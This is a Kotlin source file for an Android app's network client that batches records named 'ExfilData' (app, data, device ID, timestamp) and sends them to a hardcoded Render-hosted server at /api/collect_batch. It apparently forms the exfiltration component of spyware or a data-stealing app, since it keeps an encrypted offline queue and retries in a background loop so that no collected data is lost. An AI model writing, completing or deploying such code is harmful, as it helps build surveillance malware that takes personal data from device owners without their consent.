package com.yourpackage.network

import android.content.Context
import android.util.Log
import com.google.gson.Gson
import com.yourpackage.data.AppDatabase
import com.yourpackage.data.ExfilData
import com.yourpackage.data.PendingPayload
import com.yourpackage.utils.EncryptionManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

/**
 * API Client for communicating with the backend server.
 * Handles:
 * - Sending batches of data
 * - Offline storage with retry queue
 * - Exponential backoff
 * - Encryption of payloads
 */
class ApiClient(private val context: Context) {

    companion object {
        private const val TAG = "ApiClient"
        private const val BASE_URL = "https://test-backend-8xgb.onrender.com" // Replace with your Render URL
        private const val API_KEY = "research-lab-2026"
        private const val BATCH_SIZE = 10
        private const val TIMEOUT_SECONDS = 30L
    }

    private val gson = Gson()
    private val database = AppDatabase.getInstance(context)
    private val dao = database.pendingPayloadDao()

    private val client = OkHttpClient.Builder()
        .connectTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .writeTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .readTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .build()

    /**
     * Send a batch of ExfilData to the server.
     * If the network fails, the data is saved to the local database for retry.
     */
    suspend fun sendBatch(batch: List<ExfilData>): ApiResponse<List<Long>> {
        return withContext(Dispatchers.IO) {
            try {
                // Convert to JSON array
                val jsonArray = JSONArray()
                batch.forEach { item ->
                    val jsonObject = JSONObject().apply {
                        put("type", item.type)
                        put("app", item.app)
                        put("data", item.data)
                        put("device_id", item.device_id)
                        put("timestamp", item.timestamp)
                    }
                    jsonArray.put(jsonObject)
                }

                // Encrypt the payload before sending (optional - uncomment if you want encryption)
                // val encryptedPayload = EncryptionManager.encrypt(jsonArray.toString())

                val jsonBody = JSONObject().apply {
                    put("batch", jsonArray)
                    put("api_key", API_KEY)
                }

                val requestBody = jsonBody.toString()
                    .toRequestBody("application/json".toMediaType())

                val request = Request.Builder()
                    .url("$BASE_URL/api/collect_batch")
                    .post(requestBody)
                    .build()

                val response = client.newCall(request).execute()
                val responseBody = response.body?.string() ?: ""

                if (response.isSuccessful) {
                    // Parse response to get inserted IDs
                    val jsonResponse = JSONObject(responseBody)
                    val inserted = jsonResponse.optInt("inserted", 0)
                    val ids = mutableListOf<Long>()
                    if (jsonResponse.has("ids")) {
                        val idsArray = jsonResponse.getJSONArray("ids")
                        for (i in 0 until idsArray.length()) {
                            ids.add(idsArray.getLong(i))
                        }
                    }
                    Log.d(TAG, "✅ Sent ${batch.size} items successfully. Inserted: $inserted")
                    ApiResponse.Success(ids)
                } else {
                    Log.e(TAG, "❌ Server error: ${response.code} - $responseBody")
                    // Save to offline queue on failure
                    saveToOfflineQueue(batch)
                    ApiResponse.Error("Server error: ${response.code}", response.code)
                }
            } catch (e: IOException) {
                Log.e(TAG, "❌ Network error: ${e.message}")
                // Save to offline queue on network failure
                saveToOfflineQueue(batch)
                ApiResponse.Error("Network error: ${e.message}")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Unexpected error: ${e.message}")
                // Save to offline queue on any failure
                saveToOfflineQueue(batch)
                ApiResponse.Error("Unexpected error: ${e.message}")
            }
        }
    }

    /**
     * Save a batch to the offline queue for retry later.
     */
    private suspend fun saveToOfflineQueue(batch: List<ExfilData>) {
        try {
            val pendingPayloads = batch.map { item ->
                val jsonData = item.toJson()
                // Encrypt the data before storing
                val encryptedJson = EncryptionManager.encrypt(jsonData)
                PendingPayload(
                    jsonData = encryptedJson,
                    attempts = 0,
                    nextRetry = System.currentTimeMillis() + 60_000 // Retry after 1 minute
                )
            }
            dao.insertAll(*pendingPayloads.toTypedArray())
            Log.d(TAG, "💾 Saved ${pendingPayloads.size} items to offline queue")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to save to offline queue: ${e.message}")
        }
    }

    /**
     * Process the offline queue - retry all pending items that are ready.
     */
    suspend fun processOfflineQueue(): Int {
        return withContext(Dispatchers.IO) {
            try {
                val currentTime = System.currentTimeMillis()
                val pendingItems = dao.getReadyToRetry(currentTime)

                if (pendingItems.isEmpty()) {
                    return@withContext 0
                }

                Log.d(TAG, "🔄 Processing ${pendingItems.size} pending items from offline queue")
                var successCount = 0

                // Group into batches of BATCH_SIZE
                pendingItems.chunked(BATCH_SIZE).forEach { batch ->
                    try {
                        // Decrypt and parse each item
                        val exfilDataList = batch.map { pending ->
                            val decryptedJson = EncryptionManager.decrypt(pending.jsonData)
                            ExfilData.fromJson(decryptedJson)
                        }

                        // Try to send the batch
                        val response = sendBatch(exfilDataList)

                        if (response is ApiResponse.Success) {
                            // Delete from queue on success
                            batch.forEach { pending ->
                                dao.deleteById(pending.id)
                            }
                            successCount += batch.size
                            Log.d(TAG, "✅ Sent ${batch.size} items from offline queue")
                        } else {
                            // Update retry info for each item
                            batch.forEach { pending ->
                                val updated = pending.withIncrementedAttempts()
                                dao.updateRetryInfo(updated.id, updated.attempts, updated.nextRetry)
                            }
                            Log.d(TAG, "⏳ Updated retry info for ${batch.size} items")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Failed to process offline batch: ${e.message}")
                        // Update retry info for the failed batch
                        batch.forEach { pending ->
                            val updated = pending.withIncrementedAttempts()
                            dao.updateRetryInfo(updated.id, updated.attempts, updated.nextRetry)
                        }
                    }
                }

                return@withContext successCount
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to process offline queue: ${e.message}")
                return@withContext 0
            }
        }
    }

    /**
     * Get the total number of pending items in the offline queue.
     */
    suspend fun getOfflineQueueSize(): Int {
        return withContext(Dispatchers.IO) {
            try {
                dao.getCount()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to get queue size: ${e.message}")
                0
            }
        }
    }

    /**
     * Start the background retry worker.
     * This should be called periodically (e.g., every minute) to process the queue.
     */
    fun startBackgroundRetry() {
        val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
        scope.launch {
            while (true) {
                try {
                    processOfflineQueue()
                    // Wait 60 seconds before checking again
                    kotlinx.coroutines.delay(60_000L)
                } catch (e: Exception) {
                    Log.e(TAG, "Background retry error: ${e.message}")
                    kotlinx.coroutines.delay(60_000L)
                }
            }
        }
    }

    /**
     * Send a single item (convenience method).
     */
    suspend fun sendItem(item: ExfilData): ApiResponse<List<Long>> {
        return sendBatch(listOf(item))
    }

    /**
     * Check if the server is reachable.
     */
    suspend fun checkHealth(): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val request = Request.Builder()
                    .url("$BASE_URL/health")
                    .get()
                    .build()

                val response = client.newCall(request).execute()
                val isHealthy = response.isSuccessful
                response.close()
                isHealthy
            } catch (e: Exception) {
                false
            }
        }
    }
}